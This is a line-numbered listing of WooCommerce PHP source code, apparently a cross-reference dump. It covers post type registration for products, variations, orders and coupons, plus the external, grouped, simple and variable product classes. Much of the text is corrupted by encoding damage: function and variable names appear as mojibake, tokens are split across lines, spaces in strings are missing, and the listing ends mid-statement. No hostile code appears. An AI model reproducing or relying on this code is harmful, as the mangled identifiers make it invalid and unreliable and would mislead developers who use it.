190 'add_Ãw_™em' => 
	`¥rštf
Ğ
	`__
Ğ'Add New %s', 'woocomm”û' ), 
$Ïb–
 ),

191 'Ãw_™em_Çme' => 
	`¥rštf
Ğ
	`__
Ğ'New %s', 'woocomm”û' ), 
$Ïb–
 )

193 'show_ui' => 
çl£
,

194 'qu”y_v¬' => 
Œue
,

195 'ÿ·b™›s' => 
	`¬¿y
(

201 'show_š_Çv_m’us' => 
	`­¶y_f‹rs
Ğ'woocomm”û_©Œibu‹_show_š_Çv_m’us', 
çl£
, 
$Çme
 ),

202 '»wr™e' => 
	`¬¿y
(

203 '¦ug' => ( 
	`em±y
Ğ
$³rm®šks
['©Œibu‹_ba£'] ) ? '' : 
	`Œašg¦ash™
Ğ$³rm®šks['©Œibu‹_ba£'] ) ) . 
	`§n™ize_t™Ë
Ğ
$x
->
©Œibu‹_Çme
 ),

204 'w™h_äÚt' => 
çl£
,

205 'h›¿rchiÿl' => 
Œue


212 
	`do_aùiÚ
( 'woocommerce_after_register_taxonomy' );

214 
	}
}

219 
public
 
funùiÚ
 
	$»gi¡”_po¡_ty³s
() {

220 iàĞ
	`po¡_ty³_exi¡s
('product') )

223 
	`do_aùiÚ
( 'woocommerce_register_post_type' );

225 
$³rm®šks
 = 
	`g‘_İtiÚ
( 'woocommerce_permalinks' );

226 
$´oduù_³rm®šk
 = 
	`em±y
Ğ
$³rm®šks
['´oduù_ba£'] ) ? 
	`_x
( 'product', 'slug', 'woocommerce' ) : $permalinks['product_base'];

228 
	`»gi¡”_po¡_ty³
( "product",

229 
	`­¶y_f‹rs
( 'woocommerce_register_post_type_product',

230 
	`¬¿y
(

231 'Ïb–s' => 
	`¬¿y
(

232 'Çme' => 
	`__
( 'Products', 'woocommerce' ),

233 'sšguÏr_Çme' => 
	`__
( 'Product', 'woocommerce' ),

234 'm’u_Çme' => 
	`_x
( 'Products', 'Admin menu‚ame', 'woocommerce' ),

235 'add_Ãw' => 
	`__
( 'Add Product', 'woocommerce' ),

236 'add_Ãw_™em' => 
	`__
( 'Add New Product', 'woocommerce' ),

237 'ed™' => 
	`__
( 'Edit', 'woocommerce' ),

238 'ed™_™em' => 
	`__
( 'Edit Product', 'woocommerce' ),

239 'Ãw_™em' => 
	`__
( 'New Product', 'woocommerce' ),

240 'v›w' => 
	`__
( 'View Product', 'woocommerce' ),

241 'v›w_™em' => 
	`__
( 'View Product', 'woocommerce' ),

242 '£¬ch_™ems' => 
	`__
( 'Search Products', 'woocommerce' ),

243 'nÙ_found' => 
	`__
( 'No Products found', 'woocommerce' ),

244 'nÙ_found_š_Œash' => 
	`__
( 'No Products found inrash', 'woocommerce' ),

245 '·»Á' => 
	`__
( 'Parent Product', 'woocommerce' )

247 'desütiÚ' => 
	`__
( 'This is where you can‡dd‚ew…roductso your store.', 'woocommerce' ),

248 'public' => 
Œue
,

249 'show_ui' => 
Œue
,

251 'm­_m‘a_ÿp' => 
Œue
,

252 'publişy_qu”yabË' => 
Œue
,

253 'exşude_äom_£¬ch' => 
çl£
,

254 'h›¿rchiÿl' => 
çl£
,

255 '»wr™e' => 
$´oduù_³rm®šk
 ? 
	`¬¿y
Ğ'¦ug' => 
	`uÁ¿šg¦ash™
Ğ$´oduù_³rm®šk ), 'w™h_äÚt' => 
çl£
, 'ãeds' => 
Œue
 ) : false,

256 'qu”y_v¬' => 
Œue
,

257 'suµÜts' => 
	`¬¿y
( 'title', 'editor', 'excerpt', 'thumbnail', 'comments', 'custom-fields', 'page-attributes' ),

258 'has_¬chive' => ( 
$shİ_·ge_id
 = 
	`wc_g‘_·ge_id
Ğ'shİ' ) ) && 
	`g‘_·ge
Ğ$shİ_·ge_id ) ? 
	`g‘_·ge_uri
( $shop_page_id ) : 'shop',

259 'show_š_Çv_m’us' => 
Œue


264 
	`»gi¡”_po¡_ty³
( "product_variation",

265 
	`­¶y_f‹rs
( 'woocommerce_register_post_type_product_variation',

266 
	`¬¿y
(

267 'Ïb–' => 
	`__
( 'Variations', 'woocommerce' ),

268 'public' => 
çl£
,

269 'h›¿rchiÿl' => 
çl£
,

270 'suµÜts' => 
çl£


275 
$m’u_Çme
 = 
	`_x
('Orders', 'Admin menu‚ame', 'woocommerce' );

277 iàĞ
$Üd”_couÁ
 = 
	`wc_´oûssšg_Üd”_couÁ
() ) {

278 
$m’u_Çme
 .ğ" <¥ª cÏss='awa™šg-mod upd©e-¶ugš couÁ-$Üd”_couÁ'><¥ª cÏss='´oûssšg-couÁ'>" . 
	`numb”_fÜm©_i18n
Ğ
$Üd”_couÁ
 ) . "</span></span>" ;

281 
	`»gi¡”_po¡_ty³
( "shop_order",

282 
	`­¶y_f‹rs
( 'woocommerce_register_post_type_shop_order',

283 
	`¬¿y
(

284 'Ïb–s' => 
	`¬¿y
(

285 'Çme' => 
	`__
( 'Orders', 'woocommerce' ),

286 'sšguÏr_Çme' => 
	`__
( 'Order', 'woocommerce' ),

287 'add_Ãw' => 
	`__
( 'Add Order', 'woocommerce' ),

288 'add_Ãw_™em' => 
	`__
( 'Add New Order', 'woocommerce' ),

289 'ed™' => 
	`__
( 'Edit', 'woocommerce' ),

290 'ed™_™em' => 
	`__
( 'Edit Order', 'woocommerce' ),

291 'Ãw_™em' => 
	`__
( 'New Order', 'woocommerce' ),

292 'v›w' => 
	`__
( 'View Order', 'woocommerce' ),

293 'v›w_™em' => 
	`__
( 'View Order', 'woocommerce' ),

294 '£¬ch_™ems' => 
	`__
( 'Search Orders', 'woocommerce' ),

295 'nÙ_found' => 
	`__
( 'No Orders found', 'woocommerce' ),

296 'nÙ_found_š_Œash' => 
	`__
( 'No Orders found inrash', 'woocommerce' ),

297 '·»Á' => 
	`__
( 'Parent Orders', 'woocommerce' ),

298 'm’u_Çme' => 
$m’u_Çme


300 'desütiÚ' => 
	`__
( 'This is where store orders‡re stored.', 'woocommerce' ),

301 'public' => 
çl£
,

302 'show_ui' => 
Œue
,

304 'm­_m‘a_ÿp' => 
Œue
,

305 'publişy_qu”yabË' => 
çl£
,

306 'exşude_äom_£¬ch' => 
Œue
,

307 'show_š_m’u' => 
	`cu¼’t_u£r_ÿn
Ğ'mªage_woocomm”û' ) ? 'woocomm”û' : 
Œue
,

308 'h›¿rchiÿl' => 
çl£
,

309 'show_š_Çv_m’us' => 
çl£
,

310 '»wr™e' => 
çl£
,

311 'qu”y_v¬' => 
çl£
,

312 'suµÜts' => 
	`¬¿y
( 'title', 'comments', 'custom-fields' ),

313 'has_¬chive' => 
çl£
,

318 iàĞ
	`g‘_İtiÚ
( 'woocommerce_enable_coupons' ) == 'yes' ) {

319 
	`»gi¡”_po¡_ty³
( "shop_coupon",

320 
	`­¶y_f‹rs
( 'woocommerce_register_post_type_shop_coupon',

321 
	`¬¿y
(

322 'Ïb–s' => 
	`¬¿y
(

323 'Çme' => 
	`__
( 'Coupons', 'woocommerce' ),

324 'sšguÏr_Çme' => 
	`__
( 'Coupon', 'woocommerce' ),

325 'm’u_Çme' => 
	`_x
( 'Coupons', 'Admin menu‚ame', 'woocommerce' ),

326 'add_Ãw' => 
	`__
( 'Add Coupon', 'woocommerce' ),

327 'add_Ãw_™em' => 
	`__
( 'Add New Coupon', 'woocommerce' ),

328 'ed™' => 
	`__
( 'Edit', 'woocommerce' ),

329 'ed™_™em' => 
	`__
( 'Edit Coupon', 'woocommerce' ),

330 'Ãw_™em' => 
	`__
( 'New Coupon', 'woocommerce' ),

331 'v›w' => 
	`__
( 'View Coupons', 'woocommerce' ),

332 'v›w_™em' => 
	`__
( 'View Coupon', 'woocommerce' ),

333 '£¬ch_™ems' => 
	`__
( 'Search Coupons', 'woocommerce' ),

334 'nÙ_found' => 
	`__
( 'No Coupons found', 'woocommerce' ),

335 'nÙ_found_š_Œash' => 
	`__
( 'No Coupons found inrash', 'woocommerce' ),

336 '·»Á' => 
	`__
( 'Parent Coupon', 'woocommerce' )

338 'desütiÚ' => 
	`__
( 'This is where you can‡dd‚ew couponshat customers can use in your store.', 'woocommerce' ),

339 'public' => 
çl£
,

340 'show_ui' => 
Œue
,

342 'm­_m‘a_ÿp' => 
Œue
,

343 'publişy_qu”yabË' => 
çl£
,

344 'exşude_äom_£¬ch' => 
Œue
,

345 'show_š_m’u' => 
	`cu¼’t_u£r_ÿn
Ğ'mªage_woocomm”û' ) ? 'woocomm”û' : 
Œue
,

346 'h›¿rchiÿl' => 
çl£
,

347 '»wr™e' => 
çl£
,

348 'qu”y_v¬' => 
çl£
,

349 'suµÜts' => 
	`¬¿y
( 'title' ),

350 'show_š_Çv_m’us' => 
çl£
,

351 'show_š_admš_b¬' => 
Œue


356 
	}
}

359 
Ãw
 
WC_Po¡_ty³s
();

	@includes/class-wc-product-external.php

1 <?
php


3 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

16 şas 
	cWC_Produù_Ex‹º®
 
ex‹nds
 
	mWC_Produù
 {

24 
public
 
funùiÚ
 
	$__cÚ¡ruù
Ğ
$´oduù
 ) {

25 
$this
->
´oduù_ty³
 = 'external';

26 
·»Á
::
	`__cÚ¡ruù
Ğ
$´oduù
 );

35 
public
 
funùiÚ
 
	$is_purcha§bË
() {

36  
	`­¶y_f‹rs
Ğ'woocomm”û_is_purcha§bË', 
çl£
, 
$this
 );

37 
	}
}

45 
public
 
funùiÚ
 
	$add_to_ÿ¹_u¾
() {

46  
	`­¶y_f‹rs
Ğ'woocomm”û_´oduù_add_to_ÿ¹_u¾', 
$this
->
	`g‘_´oduù_u¾
(), $this );

47 
	}
}

55 
public
 
funùiÚ
 
	$sšgË_add_to_ÿ¹_‹xt
() {

56  
	`­¶y_f‹rs
Ğ'woocomm”û_´oduù_sšgË_add_to_ÿ¹_‹xt', 
$this
->
	`g‘_bu‰Ú_‹xt
(), $this );

57 
	}
}

65 
public
 
funùiÚ
 
	$add_to_ÿ¹_‹xt
() {

66  
	`­¶y_f‹rs
Ğ'woocomm”û_´oduù_sšgË_add_to_ÿ¹_‹xt', 
$this
->
	`g‘_bu‰Ú_‹xt
(), $this );

67 
	}
}

75 
public
 
funùiÚ
 
	$g‘_´oduù_u¾
() {

76  
	`esc_u¾
Ğ
$this
->
´oduù_u¾
 );

77 
	}
}

85 
public
 
funùiÚ
 
	$g‘_bu‰Ú_‹xt
() {

86  
$this
->
bu‰Ú_‹xt
 ? $this->bu‰Ú_‹xˆ: 
	`__
( 'Buy…roduct', 'woocommerce' );

87 
	}
}

	@includes/class-wc-product-factory.php

1 <?
php


14 şas 
	cWC_Produù_FaùÜy
 {

24 
public
 
funùiÚ
 
g‘_´oduù
Ğ
$the_´oduù
 = 
çl£
, 
$¬gs
 = 
	$¬¿y
() ) {

25 
glob®
 
$po¡
;

27 iàĞ
çl£
 ==ğ
$the_´oduù
 ) {

28 
$the_´oduù
 = 
$po¡
;

29 } 
	`–£if
 ( 
	`is_num”ic
Ğ
$the_´oduù
 ) ) {

30 
$the_´oduù
 = 
	`g‘_po¡
( $the_product );

33 iàĞ! 
$the_´oduù
 )

34  
çl£
;

36 iàĞ
	`is_objeù
 ( 
$the_´oduù
 ) ) {

37 
$´oduù_id
 = 
	`absšt
Ğ
$the_´oduù
->
ID
 );

38 
$po¡_ty³
 = 
$the_´oduù
->
po¡_ty³
;

41 iàĞ
	`š_¬¿y
Ğ
$po¡_ty³
, 
	`¬¿y
( 'product', 'product_variation' ) ) ) {

42 iàĞ
	`is£t
Ğ
$¬gs
['product_type'] ) ) {

43 
$´oduù_ty³
 = 
$¬gs
['product_type'];

44 } 
	`–£if
 ( '´oduù_v¬ŸtiÚ' =ğ
$po¡_ty³
 ) {

45 
$´oduù_ty³
 = 'variation';

47 
$‹rms
 = 
	`g‘_the_‹rms
Ğ
$´oduù_id
, 'product_type' );

48 
$´oduù_ty³
 = ! 
	`em±y
Ğ
$‹rms
 ) && 
	`is£t
Ğ
	`cu¼’t
Ğ$‹rm )->
Çme
 ) ? 
	`§n™ize_t™Ë
( current( $terms )->name ) : 'simple';

52 
$şas¢ame
 = 'WC_Produù_' . 
	`im¶ode
Ğ'_', 
	`¬¿y_m­
Ğ'ucfœ¡', 
	`ex¶ode
Ğ'-', 
$´oduù_ty³
 ) ) );

54 
$şas¢ame
 = 
çl£
;

55 
$´oduù_ty³
 = 
çl£
;

59 
$şas¢ame
 = 
	`­¶y_f‹rs
Ğ'woocomm”û_´oduù_şass', $şas¢ame, 
$´oduù_ty³
, 
$po¡_ty³
, 
$´oduù_id
 );

61 iàĞ! 
	`şass_exi¡s
Ğ
$şas¢ame
 ) )

62 
$şas¢ame
 = 'WC_Product_Simple';

64  
Ãw
 
	`$şas¢ame
Ğ
$the_´oduù
, 
$¬gs
 );

66 
	}
}

	@includes/class-wc-product-grouped.php

1 <?
php


3 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

16 şas 
	cWC_Produù_Grou³d
 
ex‹nds
 
	mWC_Produù
 {

19 
public
 
	m$chd»n
;

22 
public
 
	m$tÙ®_¡ock
;

30 
public
 
funùiÚ
 
	$__cÚ¡ruù
Ğ
$´oduù
 ) {

31 
$this
->
´oduù_ty³
 = 'grouped';

32 
·»Á
::
	`__cÚ¡ruù
Ğ
$´oduù
 );

41 
public
 
funùiÚ
 
	$add_to_ÿ¹_‹xt
() {

42  
	`­¶y_f‹rs
Ğ'woocomm”û_´oduù_add_to_ÿ¹_‹xt', 
	`__
Ğ'V›w…roduùs', 'woocomm”û' ), 
$this
 );

43 
	}
}

53 
public
 
funùiÚ
 
	$g‘_tÙ®_¡ock
() {

55 iàĞ
	`em±y
Ğ
$this
->
tÙ®_¡ock
 ) ) {

57 
$Œªs›Á_Çme
 = 'wc_´oduù_tÙ®_¡ock_' . 
$this
->
id
;

59 iàĞ
çl£
 ==ğĞ
$this
->
tÙ®_¡ock
 = 
	`g‘_Œªs›Á
Ğ
$Œªs›Á_Çme
 ) ) ) {

60 
$this
->
tÙ®_¡ock
 = $this->
¡ock
;

62 iàĞĞ
$this
->
	`g‘_chd»n
() ) > 0 ) {

63 
	`fÜ—ch
 (
$this
->
	`g‘_chd»n
(è
as
 
$chd_id
) {

64 
$¡ock
 = 
	`g‘_po¡_m‘a
Ğ
$chd_id
, '_¡ock', 
Œue
 );

66 iàĞ
$¡ock
 != '' ) {

67 
$this
->
tÙ®_¡ock
 +ğ
	`štv®
Ğ
$¡ock
 );

72 
	`£t_Œªs›Á
Ğ
$Œªs›Á_Çme
, 
$this
->
tÙ®_¡ock
, 
YEAR_IN_SECONDS
 );

76  
	`­¶y_f‹rs
Ğ'woocomm”û_¡ock_amouÁ', 
$this
->
tÙ®_¡ock
 );

77 
	}
}

85 
public
 
funùiÚ
 
	$g‘_chd»n
() {

87 iàĞ! 
	`is_¬¿y
Ğ
$this
->
chd»n
 ) ) {

89 
$this
->
chd»n
 = 
	`¬¿y
();

91 
$Œªs›Á_Çme
 = 'wc_´oduù_chd»n_ids_' . 
$this
->
id
;

93 iàĞ
çl£
 ==ğĞ
$this
->
chd»n
 = 
	`g‘_Œªs›Á
Ğ
$Œªs›Á_Çme
 ) ) ) {

95 
$this
->
chd»n
 = 
	`g‘_po¡s
Ğ'po¡_·»Á=' . $this->
id
 . '&post_type=product&orderby=menu_order&order=ASC&fields=ids&post_status=publish&numberposts=-1' );

97 
	`£t_Œªs›Á
Ğ
$Œªs›Á_Çme
, 
$this
->
chd»n
, 
YEAR_IN_SECONDS
 );

101  (
¬¿y
è
$this
->
chd»n
;

102 
	}
}

112 
public
 
funùiÚ
 
	$g‘_chd
Ğ
$chd_id
 ) {

113  
	`g‘_´oduù
Ğ
$chd_id
 );

114 
	}
}

123 
public
 
funùiÚ
 
	$has_chd
() {

124  Ğ
$this
->
	`g‘_chd»n
(èè? 
Œue
 : 
çl£
;

125 
	}
}

134 
public
 
funùiÚ
 
	$is_Ú_§Ë
() {

135 iàĞ
$this
->
	`has_chd
() ) {

137 
	`fÜ—ch
 ( 
$this
->
	`g‘_chd»n
(è
as
 
$chd_id
 ) {

138 
$§Ë_´iû
 = 
	`g‘_po¡_m‘a
Ğ
$chd_id
, '_§Ë_´iû', 
Œue
 );

139 iàĞ
$§Ë_´iû
 !== "" && $sale_price >= 0 )

140  
Œue
;

145 iàĞ
$this
->
§Ë_´iû
 && $this->§Ë_´iû =ğ$this->
´iû
 )

146  
Œue
;

149  
çl£
;

150 
	}
}

159 
public
 
funùiÚ
 
	$is_purcha§bË
() {

160  
	`­¶y_f‹rs
Ğ'woocomm”û_is_purcha§bË', 
çl£
, 
$this
 );

161 
	}
}

170 
public
 
funùiÚ
 
g‘_´iû_html
Ğ
$´iû
 = '' ) {

171 
$x_di¥Ïy_mode
 = 
g‘_İtiÚ
( 'woocommerce_tax_display_shop' );

172 
	g$chd_´iûs
 = 
¬¿y
();

174 
fÜ—ch
 ( 
$this
->
g‘_chd»n
(è
as
 
$chd_id
 )

175 
	g$chd_´iûs
[] = 
g‘_po¡_m‘a
Ğ
$chd_id
, '_´iû', 
Œue
 );

177 
	g$chd_´iûs
 = 
¬¿y_unique
Ğ
$chd_´iûs
 );

178 
	g$g‘_´iû_m‘hod
 = 'g‘_´iû_' . 
$x_di¥Ïy_mode
 . 'uding_tax';

180 iàĞ! 
em±y
Ğ
$chd_´iûs
 ) ) {

181 
	g$mš_´iû
 = 
mš
Ğ
$chd_´iûs
 );

182 
	g$max_´iû
 = 
max
Ğ
$chd_´iûs
 );

184 
	g$mš_´iû
 = '';

185 
	g$max_´iû
 = '';

188 iàĞ
	g$mš_´iû
 ) {

189 iàĞ
	g$mš_´iû
 =ğ
$max_´iû
 ) {

190 
$di¥Ïy_´iû
 = 
wc_´iû
Ğ
$this
->
$g‘_´iû_m‘hod
Ğ1, 
$mš_´iû
 ) );

192 
	g$äom
 = 
wc_´iû
Ğ
$this
->
$g‘_´iû_m‘hod
Ğ1, 
$mš_´iû
 ) );

193 
	g$to
 = 
wc_´iû
Ğ
$this
->
$g‘_´iû_m‘hod
Ğ1, 
$max_´iû
 ) );

194 
	g$di¥Ïy_´iû
 = 
¥rštf
Ğ
_x
Ğ'%1$s&ndash;%2$s', 'Priû„ªge: from-to', 'woocomm”û' ), 
$äom
, 
$to
 );

197 
	g$´iû
 .ğ
$di¥Ïy_´iû
 . 
$this
->
g‘_´iû_suffix
();

199 
	g$´iû
 = 
­¶y_f‹rs
Ğ'woocomm”û_grou³d_´iû_html', 
$´iû
, 
$this
 );

201 
	g$´iû
 = 
­¶y_f‹rs
Ğ'woocomm”û_grou³d_em±y_´iû_html', '', 
$this
 );

204  
­¶y_f‹rs
Ğ'woocomm”û_g‘_´iû_html', 
$´iû
, 
$this
 );

	@includes/class-wc-product-simple.php

1 <?
php


3 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

16 şas 
	cWC_Produù_Sim¶e
 
ex‹nds
 
	mWC_Produù
 {

24 
public
 
funùiÚ
 
	$__cÚ¡ruù
Ğ
$´oduù
 ) {

25 
$this
->
´oduù_ty³
 = 'simple';

26 
·»Á
::
	`__cÚ¡ruù
Ğ
$´oduù
 );

35 
public
 
funùiÚ
 
	$add_to_ÿ¹_u¾
() {

36 
$u¾
 = 
$this
->
	`is_purcha§bË
(è&& $this->
	`is_š_¡ock
(è? 
	`»move_qu”y_¬g
Ğ'added-to-ÿ¹', 
	`add_qu”y_¬g
Ğ'add-to-ÿ¹', $this->
id
 ) ) : 
	`g‘_³rm®šk
( $this->id );

38  
	`­¶y_f‹rs
Ğ'woocomm”û_´oduù_add_to_ÿ¹_u¾', 
$u¾
, 
$this
 );

39 
	}
}

47 
public
 
funùiÚ
 
	$add_to_ÿ¹_‹xt
() {

48 
$‹xt
 = 
$this
->
	`is_purcha§bË
(è&& $this->
	`is_š_¡ock
(è? 
	`__
( 'Addo cart', 'woocommerce' ) : __( 'Read More', 'woocommerce' );

50  
	`­¶y_f‹rs
Ğ'woocomm”û_´oduù_add_to_ÿ¹_‹xt', 
$‹xt
, 
$this
 );

51 
	}
}

59 
public
 
funùiÚ
 
	$g‘_t™Ë
() {

61 
$t™Ë
 = 
$this
->
po¡
->
po¡_t™Ë
;

63 iàĞ
$this
->
	`g‘_·»Á
() > 0 ) {

64 
$t™Ë
 = 
	`g‘_the_t™Ë
Ğ
$this
->
	`g‘_·»Á
() ) . ' &rarr; ' . $title;

67  
	`­¶y_f‹rs
Ğ'woocomm”û_´oduù_t™Ë', 
$t™Ë
, 
$this
 );

68 
	}
}

76 
public
 
funùiÚ
 
	$grou³d_´oduù_sync
() {

77 
glob®
 
$wpdb
, 
$woocomm”û
;

79 iàĞ! 
$this
->
	`g‘_·»Á
() ) ;

81 
$chd»n_by_´iû
 = 
	`g‘_po¡s
Ğ
	`¬¿y
(

82 'po¡_·»Á' => 
$this
->
	`g‘_·»Á
(),

90 iàĞ
$chd»n_by_´iû
 ) {

91 
	`fÜ—ch
 ( 
$chd»n_by_´iû
 
as
 
$chd
 ) {

92 
$chd_´iû
 = 
	`g‘_po¡_m‘a
Ğ
$chd
, '_´iû', 
Œue
 );

93 
	`upd©e_po¡_m‘a
Ğ
$this
->
	`g‘_·»Á
(), '_´iû', 
$chd_´iû
 );

97 
	`wc_d–‘e_´oduù_Œªs›Ás
Ğ
$this
->
id
 );

98 
	}
}

	@includes/class-wc-product-variable.php

1 <?
php


3 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

16 şas 
	cWC_Produù_V¬ŸbË
 
ex‹nds
 
	mWC_Produù
 {

19 
public
 
	m$chd»n
;

22 
public
 
	m$tÙ®_¡ock
;

30 
public
 
funùiÚ
 
	$__cÚ¡ruù
Ğ
$´oduù
 ) {

31 
$this
->
´oduù_ty³
 = 'variable';

32 
·»Á
::
	`__cÚ¡ruù
Ğ
$´oduù
 );

41 
public
 
funùiÚ
 
	$add_to_ÿ¹_‹xt
() {

42  
	`­¶y_f‹rs
Ğ'woocomm”û_´oduù_add_to_ÿ¹_‹xt', 
	`__
Ğ'S–eù o±iÚs', 'woocomm”û' ), 
$this
 );

43 
	}
}

53 
public
 
funùiÚ
 
	$g‘_tÙ®_¡ock
() {

55 iàĞ
	`em±y
Ğ
$this
->
tÙ®_¡ock
 ) ) {

57 
$Œªs›Á_Çme
 = 'wc_´oduù_tÙ®_¡ock_' . 
$this
->
id
;

59 iàĞ
çl£
 ==ğĞ
$this
->
tÙ®_¡ock
 = 
	`g‘_Œªs›Á
Ğ
$Œªs›Á_Çme
 ) ) ) {

60 
$this
->
tÙ®_¡ock
 = $this->
¡ock
;

62 iàĞĞ
$this
->
	`g‘_chd»n
() ) > 0 ) {

63 
	`fÜ—ch
 (
$this
->
	`g‘_chd»n
(è
as
 
$chd_id
) {

64 
$¡ock
 = 
	`g‘_po¡_m‘a
Ğ
$chd_id
, '_¡ock', 
Œue
 );

66 iàĞ
$¡ock
 != '' ) {

67 
$this
->
tÙ®_¡ock
 +ğ
	`štv®
Ğ
$¡ock
 );

72 
	`£t_Œªs›Á
Ğ
$Œªs›Á_Çme
, 
$this
->
tÙ®_¡ock
, 
YEAR_IN_SECONDS
 );

75  
	`­¶y_f‹rs
Ğ'woocomm”û_¡ock_amouÁ', 
$this
->
tÙ®_¡ock
 );

76 
	}
}

84 
funùiÚ
 
	$£t_¡ock
Ğ
$amouÁ
 = 
nuÎ
 ) {

86 
$this
->
tÙ®_¡ock
 = '';

89  
·»Á
::
	`£t_¡ock
Ğ
$amouÁ
 );

90 
	}
}

98 
public
 
funùiÚ
 
	$g‘_chd»n
Ğ
$visibË_Úly
 = 
çl£
 ) {

100 iàĞ! 
	`is_¬¿y
Ğ
$this
->
chd»n
 ) ) {

101 
$this
->
chd»n
 = 
	`¬¿y
();

103 
$Œªs›Á_Çme
 = 'wc_´oduù_chd»n_ids_' . 
$this
->
id
;

105 iàĞ
çl£
 ==ğĞ
$this
->
chd»n
 = 
	`g‘_Œªs›Á
Ğ
$Œªs›Á_Çme
 ) ) ) {

106 
$this
->
chd»n
 = 
	`g‘_po¡s
Ğ'po¡_·»Á=' . $this->
id
 . '&post_type=product_variation&orderby=menu_order&order=ASC&fields=ids&post_status=any&numberposts=-1' );

108 
	`£t_Œªs›Á
Ğ
$Œªs›Á_Çme
, 
$this
->
chd»n
, 
YEAR_IN_SECONDS
 );

112 iàĞ
$visibË_Úly
 ) {

113 
$chd»n
 = 
	`¬¿y
();

114 
	`fÜ—ch
 ( 
$this
->
chd»n
 
as
 
$chd_id
 ) {

115 iàĞ'yes' ==ğ
	`g‘_İtiÚ
( 'woocommerce_hide_out_of_stock_items' ) ) {

116 
$¡ock
 = 
	`g‘_po¡_m‘a
Ğ
$chd_id
, '_¡ock', 
Œue
 );

117 iàĞ
$¡ock
 !=ğ"" && $¡ock <ğ
	`g‘_İtiÚ
( 'woocommerce_notify_no_stock_amount' ) ) {

121 
$chd»n
[] = 
$chd_id
;

124 
$chd»n
 = 
$this
->
chd»n
;

127  
$chd»n
;

128 
	}
}

138 
public
 
funùiÚ
 
	$g‘_chd
Ğ
$chd_id
 ) {

139  
	`g‘_´oduù
Ğ
$chd_id
, 
	`¬¿y
(

140 '·»Á_id' => 
$this
->
id
,

141 '·»Á' => 
$this


143 
	}
}

152 
public
 
funùiÚ
 
	$has_chd
() {

153  Ğ
$this
->
	`g‘_chd»n
(èè? 
Œue
 : 
çl£
;

154 
	}
}

163 
public
 
funùiÚ
 
	$is_Ú_§Ë
() {

164 iàĞ
$this
->
	`has_chd
() ) {

166 
	`fÜ—ch
 ( 
$this
->
	`g‘_chd»n
Ğ
Œue
 ) 
as
 
$chd_id
 ) {

167 
$´iû
 = 
	`g‘_po¡_m‘a
Ğ
$chd_id
, '_´iû', 
Œue
 );

168 
$§Ë_´iû
 = 
	`g‘_po¡_m‘a
Ğ
$chd_id
, '_§Ë_´iû', 
Œue
 );

169 iàĞ
$§Ë_´iû
 !=ğ"" && $§Ë_´iû >ğ0 && $§Ë_´iû =ğ
$´iû
 )

170  
Œue
;

174  
çl£
;

175 
	}
}

183 
public
 
funùiÚ
 
g‘_v¬ŸtiÚ_»guÏr_´iû
Ğ
$mš_Ü_max
 = 'mš', 
$di¥Ïy
 = 
çl£
 ) {

184 
$v¬ŸtiÚ_id
 = 
g‘_po¡_m‘a
Ğ
$this
->
id
, '_' . 
$mš_Ü_max
 . '_»guÏr_´iû_v¬ŸtiÚ_id', 
Œue
 );

186 iàĞ! 
	g$v¬ŸtiÚ_id
 ) {

187  
	gçl£
;

190 
	g$´iû
 = 
g‘_po¡_m‘a
Ğ
$v¬ŸtiÚ_id
, '_»guÏr_´iû', 
Œue
 );

192 iàĞ
	g$di¥Ïy
 ) {

193 
	g$v¬ŸtiÚ
 = 
$this
->
g‘_chd
Ğ
$v¬ŸtiÚ_id
 );

194 
	g$x_di¥Ïy_mode
 = 
g‘_İtiÚ
( 'woocommerce_tax_display_shop' );

195 
	g$´iû
 = 
$x_di¥Ïy_mode
 =ğ'šş' ? 
$v¬ŸtiÚ
->
g‘_´iû_šşudšg_x
Ğ1, 
$´iû
 ) : $v¬ŸtiÚ->
g‘_´iû_exşudšg_x
( 1, $price );

198  
­¶y_f‹rs
Ğ'woocomm”û_g‘_v¬ŸtiÚ_»guÏr_´iû', 
$´iû
, 
$this
, 
$mš_Ü_max
, 
$di¥Ïy
 );

207 
public
 
funùiÚ
 
g‘_v¬ŸtiÚ_§Ë_´iû
Ğ
$mš_Ü_max
 = 'mš', 
$di¥Ïy
 = 
çl£
 ) {

208 
$v¬ŸtiÚ_id
 = 
g‘_po¡_m‘a
Ğ
$this
->
id
, '_' . 
$mš_Ü_max
 . '_§Ë_´iû_v¬ŸtiÚ_id', 
Œue
 );

210 iàĞ! 
	g$v¬ŸtiÚ_id
 ) {

211  
	gçl£
;

214 
	g$´iû
 = 
g‘_po¡_m‘a
Ğ
$v¬ŸtiÚ_id
, '_§Ë_´iû', 
Œue
 );

216 iàĞ
	g$di¥Ïy
 ) {

217 
	g$v¬ŸtiÚ
 = 
$this
->
g‘_chd
Ğ
$v¬ŸtiÚ_id
 );

218 
	g$x_di¥Ïy_mode
 = 
g‘_İtiÚ
( 'woocommerce_tax_display_shop' );

219 
	g$´iû
 = 
$x_di¥Ïy_mode
 =ğ'šş' ? 
$v¬ŸtiÚ
->
g‘_´iû_šşudšg_x
Ğ1, 
$´iû
 ) : $v¬ŸtiÚ->
g‘_´iû_exşudšg_x
( 1, $price );

222  
­¶y_f‹rs
Ğ'woocomm”û_g‘_v¬ŸtiÚ_§Ë_´iû', 
$´iû
, 
$this
, 
$mš_Ü_max
, 
$di¥Ïy
 );

231 
public
 
funùiÚ
 
g‘_v¬ŸtiÚ_´iû
Ğ
$mš_Ü_max
 = 'mš', 
$di¥Ïy
 = 
çl£
 ) {

232 
$v¬ŸtiÚ_id
 = 
g‘_po¡_m‘a
Ğ
$this
->
id
, '_' . 
$mš_Ü_max
 . '_´iû_v¬ŸtiÚ_id', 
Œue
 );

234 iàĞ
	g$di¥Ïy
 ) {

235 
	g$v¬ŸtiÚ
 = 
$this
->
g‘_chd
Ğ
$v¬ŸtiÚ_id
 );

237 iàĞ
	g$v¬ŸtiÚ
 ) {

238 
	g$x_di¥Ïy_mode
 = 
g‘_İtiÚ
( 'woocommerce_tax_display_shop' );

239 
	g$´iû
 = 
$x_di¥Ïy_mode
 =ğ'šş' ? 
$v¬ŸtiÚ
->
g‘_´iû_šşudšg_x
(è: $v¬ŸtiÚ->
g‘_´iû_exşudšg_x
();

241 
	g$´iû
 = '';

244 
	g$´iû
 = 
g‘_po¡_m‘a
Ğ
$v¬ŸtiÚ_id
, '_´iû', 
Œue
 );

247  
­¶y_f‹rs
Ğ'woocomm”û_g‘_v¬ŸtiÚ_´iû', 
$´iû
, 
$this
, 
